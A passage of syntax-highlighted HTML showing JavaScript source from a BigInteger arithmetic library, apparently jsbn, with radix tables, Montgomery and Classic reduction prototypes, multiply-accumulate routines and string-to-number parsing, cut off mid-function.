<span class="k">for</span><span class="p">(</span><span class="nx">vv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">vv</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mf">9</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="nx">vv</span><span class="p">)</span><span class="w"> </span><span class="nx">BI_RC</span><span class="p">[</span><span class="nx">rr</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">vv</span><span class="p">;</span>
<span class="nx">rr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;a&quot;</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mf">0</span><span class="p">);</span>
<span class="k">for</span><span class="p">(</span><span class="nx">vv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">10</span><span class="p">;</span><span class="w"> </span><span class="nx">vv</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">36</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="nx">vv</span><span class="p">)</span><span class="w"> </span><span class="nx">BI_RC</span><span class="p">[</span><span class="nx">rr</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">vv</span><span class="p">;</span>
<span class="nx">rr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;A&quot;</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mf">0</span><span class="p">);</span>
<span class="k">for</span><span class="p">(</span><span class="nx">vv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">10</span><span class="p">;</span><span class="w"> </span><span class="nx">vv</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">36</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="nx">vv</span><span class="p">)</span><span class="w"> </span><span class="nx">BI_RC</span><span class="p">[</span><span class="nx">rr</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">vv</span><span class="p">;</span>

<span class="nx">Classic</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">convert</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">cConvert</span><span class="p">;</span>
<span class="nx">Classic</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">revert</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">cRevert</span><span class="p">;</span>
<span class="nx">Classic</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">reduce</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">cReduce</span><span class="p">;</span>
<span class="nx">Classic</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">mulTo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">cMulTo</span><span class="p">;</span>
<span class="nx">Classic</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">sqrTo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">cSqrTo</span><span class="p">;</span><span class="w">    </span>

<span class="nx">Arcfour</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">init</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ARC4init</span><span class="p">;</span>
<span class="nx">Arcfour</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ARC4next</span><span class="p">;</span>

<span class="nx">SecureRandom</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">nextBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">rng_get_bytes</span><span class="p">;</span>

<span class="nx">Montgomery</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">convert</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">montConvert</span><span class="p">;</span>
<span class="nx">Montgomery</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">revert</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">montRevert</span><span class="p">;</span>
<span class="nx">Montgomery</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">reduce</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">montReduce</span><span class="p">;</span>
<span class="nx">Montgomery</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">mulTo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">montMulTo</span><span class="p">;</span>
<span class="nx">Montgomery</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">sqrTo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">montSqrTo</span><span class="p">;</span>
<span class="nx">Arcfour</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">init</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ARC4init</span><span class="p">;</span>
<span class="nx">Arcfour</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ARC4next</span><span class="p">;</span>


<span class="c1">// (public) Constructor</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">BigInteger</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">,</span><span class="nx">c</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">a</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="s2">&quot;number&quot;</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="ow">typeof</span><span class="w"> </span><span class="nx">a</span><span class="p">)</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">fromNumber</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">,</span><span class="nx">c</span><span class="p">);</span>
<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="s2">&quot;string&quot;</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="ow">typeof</span><span class="w"> </span><span class="nx">a</span><span class="p">)</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">fromString</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="mf">256</span><span class="p">);</span>
<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">fromString</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// return new, unset BigInteger</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">nbi</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">BigInteger</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>

<span class="c1">// am: Compute w_j += (x*this_i), propagate carries,</span>
<span class="c1">// c is initial carry, returns final carry.</span>
<span class="c1">// c &lt; 3*dvalue, x &lt; 2*dvalue, this_i &lt; dvalue</span>
<span class="c1">// We need to select the fastest one that works in this environment.</span>

<span class="c1">// am1: use a single mult and divide to get the high bits,</span>
<span class="c1">// max digit bits should be 26 because</span>
<span class="c1">// max internal value = 2*dvalue^2-2*dvalue (&lt; 2^53)</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">am1</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">w</span><span class="p">,</span><span class="nx">j</span><span class="p">,</span><span class="nx">c</span><span class="p">,</span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="o">--</span><span class="nx">n</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">v</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="o">*</span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="o">++</span><span class="p">]</span><span class="o">+</span><span class="nx">w</span><span class="p">[</span><span class="nx">j</span><span class="p">]</span><span class="o">+</span><span class="nx">c</span><span class="p">;</span>
<span class="w">    </span><span class="nx">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nx">v</span><span class="o">/</span><span class="mh">0x4000000</span><span class="p">);</span>
<span class="w">    </span><span class="nx">w</span><span class="p">[</span><span class="nx">j</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">v</span><span class="o">&amp;</span><span class="mh">0x3ffffff</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">c</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">// am2 avoids a big mult-and-extract completely.</span>
<span class="c1">// Max digit bits should be &lt;= 30 because we do bitwise ops</span>
<span class="c1">// on values up to 2*hdvalue^2-hdvalue-1 (&lt; 2^31)</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">am2</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">w</span><span class="p">,</span><span class="nx">j</span><span class="p">,</span><span class="nx">c</span><span class="p">,</span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">xl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="o">&amp;</span><span class="mh">0x7fff</span><span class="p">,</span><span class="w"> </span><span class="nx">xh</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="o">&gt;&gt;</span><span class="mf">15</span><span class="p">;</span>
<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="o">--</span><span class="nx">n</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">l</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">&amp;</span><span class="mh">0x7fff</span><span class="p">;</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">h</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="o">++</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="mf">15</span><span class="p">;</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">xh</span><span class="o">*</span><span class="nx">l</span><span class="o">+</span><span class="nx">h</span><span class="o">*</span><span class="nx">xl</span><span class="p">;</span>
<span class="w">    </span><span class="nx">l</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">xl</span><span class="o">*</span><span class="nx">l</span><span class="o">+</span><span class="p">((</span><span class="nx">m</span><span class="o">&amp;</span><span class="mh">0x7fff</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mf">15</span><span class="p">)</span><span class="o">+</span><span class="nx">w</span><span class="p">[</span><span class="nx">j</span><span class="p">]</span><span class="o">+</span><span class="p">(</span><span class="nx">c</span><span class="o">&amp;</span><span class="mh">0x3fffffff</span><span class="p">);</span>
<span class="w">    </span><span class="nx">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">l</span><span class="o">&gt;&gt;&gt;</span><span class="mf">30</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="nx">m</span><span class="o">&gt;&gt;&gt;</span><span class="mf">15</span><span class="p">)</span><span class="o">+</span><span class="nx">xh</span><span class="o">*</span><span class="nx">h</span><span class="o">+</span><span class="p">(</span><span class="nx">c</span><span class="o">&gt;&gt;&gt;</span><span class="mf">30</span><span class="p">);</span>
<span class="w">    </span><span class="nx">w</span><span class="p">[</span><span class="nx">j</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">l</span><span class="o">&amp;</span><span class="mh">0x3fffffff</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">c</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">// Alternately, set max digit bits to 28 since some</span>
<span class="c1">// browsers slow down when dealing with 32-bit numbers.</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">am3</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">w</span><span class="p">,</span><span class="nx">j</span><span class="p">,</span><span class="nx">c</span><span class="p">,</span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">xl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="o">&amp;</span><span class="mh">0x3fff</span><span class="p">,</span><span class="w"> </span><span class="nx">xh</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="o">&gt;&gt;</span><span class="mf">14</span><span class="p">;</span>
<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="o">--</span><span class="nx">n</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">l</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">&amp;</span><span class="mh">0x3fff</span><span class="p">;</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">h</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="o">++</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="mf">14</span><span class="p">;</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">xh</span><span class="o">*</span><span class="nx">l</span><span class="o">+</span><span class="nx">h</span><span class="o">*</span><span class="nx">xl</span><span class="p">;</span>
<span class="w">    </span><span class="nx">l</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">xl</span><span class="o">*</span><span class="nx">l</span><span class="o">+</span><span class="p">((</span><span class="nx">m</span><span class="o">&amp;</span><span class="mh">0x3fff</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mf">14</span><span class="p">)</span><span class="o">+</span><span class="nx">w</span><span class="p">[</span><span class="nx">j</span><span class="p">]</span><span class="o">+</span><span class="nx">c</span><span class="p">;</span>
<span class="w">    </span><span class="nx">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">l</span><span class="o">&gt;&gt;</span><span class="mf">28</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="nx">m</span><span class="o">&gt;&gt;</span><span class="mf">14</span><span class="p">)</span><span class="o">+</span><span class="nx">xh</span><span class="o">*</span><span class="nx">h</span><span class="p">;</span>
<span class="w">    </span><span class="nx">w</span><span class="p">[</span><span class="nx">j</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">l</span><span class="o">&amp;</span><span class="mh">0xfffffff</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">c</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">int2char</span><span class="p">(</span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">BI_RM</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">n</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">intAt</span><span class="p">(</span><span class="nx">s</span><span class="p">,</span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">BI_RC</span><span class="p">[</span><span class="nx">s</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">)];</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="o">==</span><span class="kc">null</span><span class="p">)</span><span class="o">?-</span><span class="mf">1</span><span class="o">:</span><span class="nx">c</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// (protected) copy this to r</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnpCopyTo</span><span class="p">(</span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="o">-</span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="o">--</span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="nx">r</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="p">;</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// (protected) set from integer value x, -DV &lt;= x &lt; DV</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnpFromInt</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">x</span><span class="o">&lt;</span><span class="mf">0</span><span class="p">)</span><span class="o">?-</span><span class="mf">1</span><span class="o">:</span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">;</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="o">-</span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">DV</span><span class="p">;</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// return bigint initialized to value</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">nbv</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kd">var</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nbi</span><span class="p">();</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">fromInt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">r</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>

<span class="c1">// (protected) set from string and radix</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnpFromString</span><span class="p">(</span><span class="nx">s</span><span class="p">,</span><span class="nx">b</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">k</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">16</span><span class="p">)</span><span class="w"> </span><span class="nx">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">4</span><span class="p">;</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">8</span><span class="p">)</span><span class="w"> </span><span class="nx">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3</span><span class="p">;</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">256</span><span class="p">)</span><span class="w"> </span><span class="nx">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">8</span><span class="p">;</span><span class="w"> </span><span class="c1">// byte array</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">2</span><span class="p">)</span><span class="w"> </span><span class="nx">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">32</span><span class="p">)</span><span class="w"> </span><span class="nx">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5</span><span class="p">;</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">4</span><span class="p">)</span><span class="w"> </span><span class="nx">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">fromRadix</span><span class="p">(</span><span class="nx">s</span><span class="p">,</span><span class="nx">b</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span><span class="w"> </span><span class="nx">mi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="nx">sh</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="o">--</span><span class="nx">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">k</span><span class="o">==</span><span class="mf">8</span><span class="p">)</span><span class="o">?</span><span class="nx">s</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="o">:</span><span class="nx">intAt</span><span class="p">(</span><span class="nx">s</span><span class="p">,</span><span class="nx">i</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;-&quot;</span><span class="p">)</span><span class="w"> </span><span class="nx">mi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">      </span><span class="k">continue</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nx">mi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">sh</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span>
<span class="w">      </span><span class="k">this</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">;</span>
<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="nx">sh</span><span class="o">+</span><span class="nx">k</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">this</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="o">-</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">|=</span><span class="w"> </span><span class="p">(</span><span class="nx">x</span><span class="o">&amp;</span><span class="p">((</span><span class="mf">1</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="o">-</span><span class="nx">sh</span><span class="p">))</span><span class="o">-</span><span class="mf">1</span><span class="p">))</span><span class="o">&lt;&lt;</span><span class="nx">sh</span><span class="p">;</span>
<span class="w">      </span><span class="k">this</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">x</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="o">-</span><span class="nx">sh</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">else</span>
<span class="w">      </span><span class="k">this</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="o">-</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">|=</span><span class="w"> </span><span class="nx">x</span><span class="o">&lt;&lt;</span><span class="nx">sh</span><span class="p">;</span>
<span class="w">    </span><span class="nx">sh</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">k</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">sh</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="p">)</span><span class="w"> </span><span class="nx">sh</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">DB</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">k</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">8</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="nx">s</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="o">&amp;</span><span class="mh">0x80</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
